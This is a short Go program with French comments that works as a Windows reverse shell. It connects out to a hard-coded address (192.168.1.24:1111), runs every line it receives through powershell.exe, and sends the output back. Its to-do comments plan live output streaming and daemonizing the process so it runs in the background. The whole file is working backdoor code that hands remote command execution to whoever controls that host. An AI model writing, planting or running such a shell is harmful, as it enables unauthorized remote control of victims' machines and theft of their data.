package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
)

// To-Do :
// - capturer stdout et renvoyer ca en live au client (capturer en 1 fois le pwd courrant + output commande en direct)
// - daemonizer via https://github.com/sevlyar/go-daemon
// - refactor pck là c immonde

func main() {
	conn, err := net.Dial("tcp", "192.168.1.24:1111")
	handleError(err)
	for {
		// On attend que le client envoie via le pipe une string qui contient \n pour pas boucler a fond + juste récup l'entrée client
		txtFromClient, err := bufio.NewReader(conn).ReadString('\n')
		handleError(err)
		cmdOutput, err := exec.Command("powershell.exe", txtFromClient).Output()
		if err != nil {
			conn.Write([]byte("Commande inconnue\n"))
		}
		_, err = conn.Write(cmdOutput)
		handleError(err)
	}
}

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
